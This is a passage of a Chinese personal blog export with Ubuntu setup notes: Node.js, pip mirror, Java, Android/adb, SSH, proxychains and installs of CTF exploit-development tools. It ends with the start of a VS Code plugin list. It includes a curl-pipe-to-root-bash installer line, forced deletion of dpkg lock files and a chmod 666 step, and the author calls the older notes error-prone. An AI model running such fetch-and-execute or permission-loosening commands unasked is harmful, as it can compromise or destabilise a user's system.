<p><a href="https://www.cnblogs.com/feiquan/p/11223487.html">https://www.cnblogs.com/feiquan/p/11223487.html</a></p>
<p>这个16根据官网大版本号修改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -</span><br><span class="line">sudo apt-get install -y nodejs</span><br></pre></td></tr></table></figure>
<h3 id="各种不需要配置软件">各种不需要配置软件<a class="header-anchor" href="#各种不需要配置软件"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install -y git python3 python3-venv python3-pip curl vim gcc net-tools tree jnettop p7zip-full</span><br></pre></td></tr></table></figure>
<h2 id="9-pip换源">9. pip换源<a class="header-anchor" href="#9-pip换源"> ¶ </a></h2>
<ol>
<li>在home目录里新建文件夹<code>.pip</code></li>
<li>在创建好的<code>.pip</code>文件夹中创建名为<code>pip.conf</code>的文件</li>
<li>在pip.conf文件中输入</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout = 6000</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">trusted-host = pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure>
<p>(此处用的是清华大学的pip源，可自行更换pip源网址)</p>
<h2 id="10-vscode安装">10. vscode安装<a class="header-anchor" href="#10-vscode安装"> ¶ </a></h2>
<ol>
<li>
<p>Ubuntu自带软件中心中搜索Visual Studio Code下载，页面中就可以直接选择安装**（推荐）**</p>
</li>
<li>
<p>从<a href="https://code.visualstudio.com/">vscode官网</a>下载最新版本，下载<strong>deb包</strong><br>
安装命令：<code>dpkg -i 安装包</code></p>
</li>
<li>
<p>启动命令：<code>code</code></p>
</li>
<li>
<p>可以在左侧图标右键，<code>添加到收藏夹</code></p>
</li>
</ol>
<h2 id="11-安装java-OracleJDK">11. 安装java OracleJDK<a class="header-anchor" href="#11-安装java-OracleJDK"> ¶ </a></h2>
<ol>
<li>
<p>下载jdk压缩包，解压到相关位置（<code>/opt/</code>）</p>
</li>
<li>
<p>配置<code>.bashrc</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># JAVA jdk11 start</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/jdk-11.0.13</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="comment"># java8-&gt;  export PATH=$JAVA_HOME/jre/bin:$PATH</span></span><br><span class="line"><span class="comment"># JAVA jdk11 end</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="12-安装AndroidStudio">12. 安装AndroidStudio<a class="header-anchor" href="#12-安装AndroidStudio"> ¶ </a></h2>
<ol>
<li>
<p>去官网下载linux压缩包，解压到相关位置（<code>/opt/</code>）</p>
</li>
<li>
<p>寻找<code>/bin/studio.sh</code>文件，命令行打开</p>
</li>
<li>
<p>固定到左侧</p>
<ol>
<li>随便使用AndroidStudio新建一个项目</li>
<li>菜单栏选择<code>Tools</code>-&gt;<code>Create DesktopEntry</code>来创建快捷方式</li>
</ol>
</li>
<li>
<p>解决AndroidStudio无法调试问题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install libncurses5</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>配置sdk目录，<code>~/.bashrc</code>中添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Android start</span></span><br><span class="line"><span class="comment"># 不确定这个是否有用</span></span><br><span class="line"><span class="built_in">export</span> ANDROID_SDK_HOME=<span class="string">&quot;<span class="variable">$HOME</span>/Android&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置sdk及ndk</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$HOME</span>/Android/Sdk/tools:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$HOME</span>/Android/Sdk/platform-tools:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$HOME</span>/Android/Sdk/ndk/21.4.7075529:<span class="variable">$PATH</span></span><br><span class="line"><span class="comment"># Android end</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>配置adb usb</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">问题：</span><br><span class="line">List of devices attached</span><br><span class="line">FA77D0303724	no permissions (missing udev rules? user is <span class="keyword">in</span> the plugdev group); see [http://developer.android.com/tools/device.html]</span><br></pre></td></tr></table></figure>
<p>解决：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo usermod -aG plugdev <span class="variable">$LOGNAME</span></span><br><span class="line">sudo apt-get install android-sdk-platform-tools-common</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>运行<code>lsusb</code>，找到设备对应的ID值；前四位为PID, 后四位为VID</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211225011905208.png" alt="image-20211225011905208"></p>
</li>
<li>
<p>创建adb_usb.ini文件，写入android设备的VID**（非必须？）**</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0x12d1 &gt; ~/.android/adb_usb.ini</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>添加<code>.rule</code>规则</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/udev/rules.d/70-android.rules</span><br><span class="line">SUBSYSTEM==<span class="string">&quot;usb&quot;</span>, ATTRS&#123;idVendor&#125;==<span class="string">&quot;18d1&quot;</span>, ATTRS&#123;idProduct&#125;==<span class="string">&quot;4ee7&quot;</span>,MODE=<span class="string">&quot;0666&quot;</span>,GROUP=<span class="string">&quot;plugdev&quot;</span>,symlink+=<span class="string">&quot;android&quot;</span>,symlink+=<span class="string">&quot;android_adb&quot;</span></span><br></pre></td></tr></table></figure>
<p>需要修改<code>ATTRS&#123;idVendor&#125;</code>和<code>ATTRS&#123;idProduct&#125;</code></p>
</li>
<li>
<p>赋予权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo chmod 666 /etc/udev/rules.d/70-android.rules</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>重启usb服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service udev restart</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>重启adb</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb kill-server</span><br><span class="line">adb start-server</span><br><span class="line">adb devices</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h2 id="13-开机提示“检测到系统程序出现问题”">13. 开机提示“检测到系统程序出现问题”<a class="header-anchor" href="#13-开机提示“检测到系统程序出现问题”"> ¶ </a></h2>
<p>提示”检测到系统程序出现问题“；提示”ubuntu出现了内部错误“</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo rm /var/crash/* <span class="comment"># 删除错误报告</span></span><br><span class="line">sudo gedit /etc/default/apport</span><br><span class="line"><span class="comment">#将enabled=1 改为 enabled=0</span></span><br></pre></td></tr></table></figure>
<h2 id="14-真机远程ssh连接虚拟机">14. 真机远程ssh连接虚拟机<a class="header-anchor" href="#14-真机远程ssh连接虚拟机"> ¶ </a></h2>
<p>虚拟机安装ssh-server</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install -y openssh-server</span><br></pre></td></tr></table></figure>
<p>查看虚拟机ip地址：（或者<code>ifconfig</code>）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hostname -I</span><br></pre></td></tr></table></figure>
<p>真机：</p>
<p>Git Bash中输入命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh [username]@[ipAddress]</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//image-20211225013650672.png" alt="image-20211225013650672"></p>
<h3 id="虚拟机中配置ssh密钥，方便记住密码">虚拟机中配置ssh密钥，方便记住密码<a class="header-anchor" href="#虚拟机中配置ssh密钥，方便记住密码"> ¶ </a></h3>
<p>将自己保存的公钥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%USERPROFILE%\.ssh\id_rsa.pub</span><br></pre></td></tr></table></figure>
<p>复制一份移动到虚拟机，cat内容添加到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p>如果只有一份密钥，则直接改名为该文件即可</p>
<p>同时赋予赋予权限，重启ssh服务(重启虚拟机)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 700 .ssh</span><br><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line">chmod 600 authorized_keys</span><br><span class="line">sshd restart <span class="comment">#或 reboot</span></span><br></pre></td></tr></table></figure>
<h2 id="15-安装配置proxychains">15. 安装配置proxychains<a class="header-anchor" href="#15-安装配置proxychains"> ¶ </a></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install proxychains -y</span><br></pre></td></tr></table></figure>
<p>编辑配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
<p>最下方的<code>[ProxyList]</code>下的<code>socks4</code>注释掉，注释掉<code>proxy_dns</code></p>
<p>添加：ip填含有代理的主机ip；prot填监听端口（v2rayN为：设置-&gt;参数设置-&gt;基础设置-&gt;本地监听端口）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socks5 [ip] [port]</span><br></pre></td></tr></table></figure>
<p>注释掉<code>proxy_dns</code></p>
<p>名字太长 设置别名：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim ~/.bash_aliases</span><br><span class="line">添加</span><br><span class="line"><span class="built_in">alias</span> pc=<span class="string">&#x27;proxychains&#x27;</span></span><br><span class="line"></span><br><span class="line">wq之后</span><br><span class="line"><span class="built_in">source</span> ~/.bash_aliases</span><br></pre></td></tr></table></figure>
<h1 id="拓展">拓展<a class="header-anchor" href="#拓展"> ¶ </a></h1>
<h2 id="vm虚拟机速度优化">vm虚拟机速度优化<a class="header-anchor" href="#vm虚拟机速度优化"> ¶ </a></h2>
<ol>
<li>优化快照速度：<br>
vm虚拟机菜单栏→编辑→首选项→优先级→【取消对勾】尽可能在后台拍摄/还原快照</li>
<li>vm虚拟机菜单栏→编辑→首选项→<br>
优先级→抓取的输入内容(高)<br>
内存→【勾选】调整所有虚拟机内存使其适应预留的主机RAM</li>
<li>编辑虚拟机设置→高级→抓取的输入内容(高)<br>
【勾选】禁用内存页面修整</li>
</ol>
<h2 id="安装VMwareTools">安装VMwareTools<a class="header-anchor" href="#安装VMwareTools"> ¶ </a></h2>
<p><a href="https://docs.vmware.com/cn/VMware-Workstation-Pro/15.0/com.vmware.ws.using.doc/GUID-08BB9465-D40A-4E16-9E15-8C016CC8166F.html">在 Linux 虚拟机中手动安装 VMware Tools</a><br>
（将VMtools安装包解压到目录，在目录里管理员运行<code>vmware-install.pl</code>即可）<strong>【弃用】</strong></p>
<p>现使用：安装VMwareTools</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install open-vm-tools-desktop</span><br></pre></td></tr></table></figure>
<h2 id="修改Ubuntu短密码">修改Ubuntu短密码<a class="header-anchor" href="#修改Ubuntu短密码"> ¶ </a></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo passwd  <span class="comment"># 修改root密码</span></span><br><span class="line">sudo passwd [username]  <span class="comment"># 修改某用户密码</span></span><br></pre></td></tr></table></figure>
<p>按提示修改密码</p>
<h2 id="突然连不上网，网络图标消失">突然连不上网，网络图标消失<a class="header-anchor" href="#突然连不上网，网络图标消失"> ¶ </a></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service network-manager restart</span><br></pre></td></tr></table></figure>
<p>ubuntu20</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service NetworkManager stop</span><br><span class="line">sudo rm /var/lib/NetworkManager/NetworkManager.state</span><br><span class="line">service NetworkManager start</span><br></pre></td></tr></table></figure>
<p>修改<code>/etc/NetworkManager/NetworkManager.conf</code><br>
<code>managed=true</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service network-manager restart</span><br></pre></td></tr></table></figure>
<h2 id="Ubuntu系统更新软件">Ubuntu系统更新软件<a class="header-anchor" href="#Ubuntu系统更新软件"> ¶ </a></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">升级安装包相关的命令,刷新可安装的软件列表(但是不做任何实际的安装动作)</span><br><span class="line"></span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">进行安装包的更新(软件版本的升级)</span><br></pre></td></tr></table></figure>
<h2 id="Ubuntu16-04安装ibus中文输入法">Ubuntu16.04安装ibus中文输入法<a class="header-anchor" href="#Ubuntu16-04安装ibus中文输入法"> ¶ </a></h2>
<p><strong>[现推荐谷歌拼音输入法](#6. 安装谷歌输入法)</strong></p>
<ol>
<li>
<p>安装Chinese语言包</p>
</li>
<li>
<p>安装ibus拼音</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ibus-pinyin</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>sudo ibus-setup</code></p>
</li>
<li>
<p><strong>重启系统</strong></p>
</li>
<li>
<p><code>sudo ibus-setup</code>打开ibus首选项</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/2020020522324094.png" alt="在这里插入图片描述"></p>
</li>
<li>
<p>Ubuntu系统设置→文本输入(Text Entry)</p>
<p>添加上ibus拼音输入法<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20200205223452263.png" alt="在这里插入图片描述"><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/202002052238526.png" alt="在这里插入图片描述"></p>
</li>
</ol>
<h2 id="无法锁定管理目录-var-lib-dpkg">无法锁定管理目录(/var/lib/dpkg/)<a class="header-anchor" href="#无法锁定管理目录-var-lib-dpkg"> ¶ </a></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo rm /var/cache/apt/archives/lock</span><br><span class="line">sudo rm /var/lib/dpkg/lock</span><br></pre></td></tr></table></figure>
<p>无法获得锁</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo rm /var/lib/dpkg/lock</span><br><span class="line"><span class="comment"># 强制删除锁所在目录</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>E: 无法获得锁 /var/lib/apt/lists/lock - open (11: 资源暂时不可用)<br>
E: 无法对目录 /var/lib/apt/lists/ 加锁</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo rm /var/lib/apt/lists/lock</span><br></pre></td></tr></table></figure>
<h2 id="apt-get系列命令">apt-get系列命令<a class="header-anchor" href="#apt-get系列命令"> ¶ </a></h2>
<h3 id="卸载软件">卸载软件<a class="header-anchor" href="#卸载软件"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove &lt;软件名&gt;  <span class="comment">#只删除软件</span></span><br><span class="line">sudo apt-get purge &lt;软件名&gt;   <span class="comment">#删除软件及其配置文件</span></span><br></pre></td></tr></table></figure>
<h3 id="删除软件安装包">删除软件安装包<a class="header-anchor" href="#删除软件安装包"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get clean</span><br></pre></td></tr></table></figure>
<p><strong>除非必要，不要使用sudo apt-get autoremove</strong>（虽然好像没啥事）</p>
<h1 id="【Archived】">【Archived】<a class="header-anchor" href="#【Archived】"> ¶ </a></h1>
<p>学习初期写下的记录，可能有不少错误，仅供参考</p>
<h2 id="ubuntu16-04升级python到3-7">ubuntu16.04升级python到3.7<a class="header-anchor" href="#ubuntu16-04升级python到3-7"> ¶ </a></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:deadsnakes/ppa</span><br><span class="line"><span class="comment"># 添加自定义源</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="comment"># 更新软件包</span></span><br><span class="line">sudo apt-get install python3.7</span><br><span class="line"><span class="comment"># 安装python3.7</span></span><br><span class="line">sudo apt-get -y install python3.7 python3.7-dev python3-pip</span><br><span class="line"><span class="comment"># 安装python3.7-dev啥玩意和pip</span></span><br><span class="line">python3.7 -m pip install pip --upgrade</span><br><span class="line">pip install --upgrade pip</span><br><span class="line"><span class="comment"># 升级pip</span></span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.5 1</span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.7 2</span><br><span class="line"><span class="comment"># 设置python的时候出来python3.7</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置python3时候出来python3.7</span></span><br><span class="line">1. 打开.bashrc</span><br><span class="line"> 	vim ~/.bashrc</span><br><span class="line"> 2. 在.bashrc中添加</span><br><span class="line"> 	<span class="built_in">alias</span> python3=python3.7</span><br><span class="line"> 	or</span><br><span class="line"> 	<span class="built_in">alias</span> python3=<span class="string">&#x27;/usr/bin/python3.7&#x27;</span></span><br><span class="line"> 3. 保存并退出文件编辑，使配置生效</span><br><span class="line"> 	<span class="built_in">source</span> ~/.bashrc</span><br><span class="line"> 	</span><br><span class="line"><span class="comment"># 更改软链接，设置默认唤起python3版本</span></span><br><span class="line">sudo rm /usr/bin/python</span><br><span class="line">sudo ln -s /usr/bin/python3 /usr/bin/python</span><br></pre></td></tr></table></figure>
<h2 id="ctf环境安装">ctf环境安装<a class="header-anchor" href="#ctf环境安装"> ¶ </a></h2>
<h3 id="安装PWNGDB">安装PWNGDB<a class="header-anchor" href="#安装PWNGDB"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install git</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">sudo ./setup.sh</span><br></pre></td></tr></table></figure>
<p>若报错<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20200205154022351.png" alt="在这里插入图片描述"><br>
改为<code>sudo -H ./setup.sh</code></p>
<p><strong>安装完后pwngdb文件夹不能删除</strong></p>
<h3 id="安装peda">安装peda<a class="header-anchor" href="#安装peda"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;source ~/peda/peda.py&quot;</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
<h3 id="安装python">安装python<a class="header-anchor" href="#安装python"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python3</span><br></pre></td></tr></table></figure>
<h3 id="安装pwntools">安装pwntools<a class="header-anchor" href="#安装pwntools"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">sudo pip install --upgrade pip</span><br><span class="line">sudo pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>
<p>安装过程中如果报“error in cryptography setup command: Invalid environment marker: python_version &lt; ‘3’”这个错误<br>
解决方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install --upgrade setuptools</span><br></pre></td></tr></table></figure>
<p>通过在python中输入<code>from pwn import * </code>来验证是否安装成功</p>
<h3 id="安装OneGadget">安装OneGadget<a class="header-anchor" href="#安装OneGadget"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get -y install ruby</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>
<h3 id="安装OneGadget-2">安装OneGadget<a class="header-anchor" href="#安装OneGadget-2"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"><span class="built_in">cd</span> ROPgadget</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure>
<h3 id="gcc编译环境安装">gcc编译环境安装<a class="header-anchor" href="#gcc编译环境安装"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gcc</span><br></pre></td></tr></table></figure>
<h3 id="qira调试工具安装">qira调试工具安装<a class="header-anchor" href="#qira调试工具安装"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/BinaryAnalysisPlatform/qira.git</span><br><span class="line"><span class="built_in">cd</span> qira/</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure>
<p>安装后使用<code>qira -s /bin/ls</code>来测试是否安装成功</p>
<p>如果报TypeError: type object got multiple values for keyword argument ‘log’ 错误<br>
解决方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> &lt;qira-dir&gt;/venv/bin/activate</span><br><span class="line">pip uninstall Flask-SocketIO</span><br><span class="line">pip install Flask-SocketIO==2.9.1</span><br><span class="line">deactivate</span><br></pre></td></tr></table></figure>
<h2 id="python库安装">python库安装<a class="header-anchor" href="#python库安装"> ¶ </a></h2>
<h3 id="z3约束器安装">z3约束器安装<a class="header-anchor" href="#z3约束器安装"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/angr/angr-z3.git</span><br><span class="line"><span class="built_in">cd</span> angr-z3</span><br><span class="line">python scripts/mk_make.py</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<p>其中第三个命令有参数，自定义z3包的安装位置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 示例 python2安装z3</span></span><br><span class="line">python scripts/mk_make.py --prefix=/home/palmer --python --pypkgdir=/home/palmer/.<span class="built_in">local</span>/lib/python2.7/site-packages</span><br><span class="line"><span class="comment"># 示例 python3安装z3</span></span><br><span class="line">python3 scripts/mk_make.py --prefix=/home/cx330 --python --pypkgdir=/home/cx330/.<span class="built_in">local</span>/lib/python3.6/site-packages</span><br><span class="line"></span><br><span class="line">python scripts/mk_make.py --prefix=想安装到的目录 --python --pypkgdir=你的python第三方库地址</span><br><span class="line">prefix 我设置的用户根目录</span><br><span class="line">pypkgdir 去找python的包目录</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20200205115602578.png" alt="在这里插入图片描述"><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/20200205122644145.png" alt="在这里插入图片描述"></p>
<h3 id="python安装gmpy2库">python安装gmpy2库<a class="header-anchor" href="#python安装gmpy2库"> ¶ </a></h3>
<ol>
<li>安装三个依赖库gmp mpfr mpc</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libgmp-dev</span><br><span class="line">sudo apt-get install libmpfr-dev</span><br><span class="line">sudo apt-get install libmpc-dev</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>gmpy2 安装</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pip3 install gmpy2</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">sudo pip install gmpy2</span><br></pre></td></tr></table></figure>
<h3 id="python安装Angr">python安装Angr<a class="header-anchor" href="#python安装Angr"> ¶ </a></h3>
<ol>
<li>安装依赖</li>
</ol>
<p>（最好安装虚拟环境）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-dev libffi-dev build-essential virtualenvwrapper</span><br><span class="line"><span class="comment">#第二步报错 mkvirtualenv未找到命令 时，执行下面一条/两条命令</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#export WORKON_HOME=$HOME/Python-workhome</span></span><br><span class="line"><span class="built_in">source</span> /usr/share/virtualenvwrapper/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>安装angr</li>
</ol>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkvirtualenv --python=$(<span class="built_in">which</span> python3) angr &amp;&amp; pip install angr</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>若报错：ERROR: pyvex 7.8.9.26 has requi rement future=-0.16.0, but you’ll have future 0.18.2 which is incompatible.<br>
将python2和python3的future均改为0.16.0版本<br>
命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pip uninstall future</span><br><span class="line">sudo pip install future==0.16.0</span><br><span class="line">sudo pip3 uninstall future</span><br><span class="line">sudo pip3 install future==0.16.0</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>官方文档：<a href="https://github.com/a7vinx/angr-doc-zh_CN/blob/master/INSTALL.md">angr官方文档</a> || <a href="https://docs.angr.io/">angr使用文档</a></p>
<h3 id="python安装pysm4库">python安装pysm4库<a class="header-anchor" href="#python安装pysm4库"> ¶ </a></h3>
<p>**安装完成后pysm4文件夹不能删除！！**提前选好安装位置</p>
<p>(好像可以删除)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/yang3yen/pysm4.git</span><br><span class="line"><span class="built_in">cd</span> pysm4</span><br><span class="line">sudo python setup.py install</span><br><span class="line"><span class="comment"># 默认python2安装，python3请特指</span></span><br></pre></td></tr></table></figure>
<h3 id="python安装pycrypto，pycrytodome和crypto">python安装pycrypto，pycrytodome和crypto<a class="header-anchor" href="#python安装pycrypto，pycrytodome和crypto"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pycryptodome</span><br></pre></td></tr></table></figure>
<p>即可安装</p>
]]></content>
      <categories>
        <category>工具&amp;环境调教</category>
      </categories>
      <tags>
        <tag>工具&amp;环境调教</tag>
      </tags>
  </entry>
  <entry>
    <title>【工具调教】VS Code 自用插件记录</title>
    <url>/Env/VSCode_self-use_plugin_record/</url>
    <content><![CDATA[<h1 id="VS-Code-自用插件记录">VS Code 自用插件记录<a class="header-anchor" href="#VS-Code-自用插件记录"> ¶ </a></h1>
<h2 id="通用">通用<a class="header-anchor" href="#通用"> ¶ </a></h2>
<table>
<thead>
<tr>
<th style="text-align:center">功能</th>
<th style="text-align:center">插件名称</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">VS code 汉化</td>
<td style="text-align:center">Chinese (Simplified) Language Pack</td>
</tr>
<tr>
<td style="text-align:center">显示文件大小</td>
<td style="text-align:center">filesize</td>
</tr>
<tr>
<td style="text-align:center">彩色多重括号</td>
<td style="text-align:center">Bracket Pair Colorizer 2</td>
</tr>
<tr>
<td style="text-align:center">Tab跳出括号</td>
<td style="text-align:center">TabOut</td>
</tr>
<tr>
<td style="text-align:center">路径补全</td>
<td style="text-align:center">Path Intellisense</td>
</tr>
<tr>
<td style="text-align:center">代码运行器</td>
<td style="text-align:center">Code Runner</td>
</tr>
<tr>
<td style="text-align:center">好看文件图标</td>
<td style="text-align:center">vscode-icons</td>
</tr>
<tr>
<td style="text-align:center">Markdown插件</td>
<td style="text-align:center">Markdown Preview Enhanced</td>
</tr>
<tr>
<td style="text-align:center">自动统计todo注释</td>
<td style="text-align:center">Todo Tree</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<h2 id="语言">语言<a class="header-anchor" href="#语言"> ¶ </a></h2>
<h3 id="HTML-CSS">HTML/CSS<a class="header-anchor" href="#HTML-CSS"> ¶ </a></h3>
<table>
<thead>
<tr>
<th style="text-align:center">功能</th>
<th style="text-align:center">插件名称</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">自动闭合HTML/CSS标签</td>
<td style="text-align:center">Auto Close Tag</td>
</tr>
<tr>
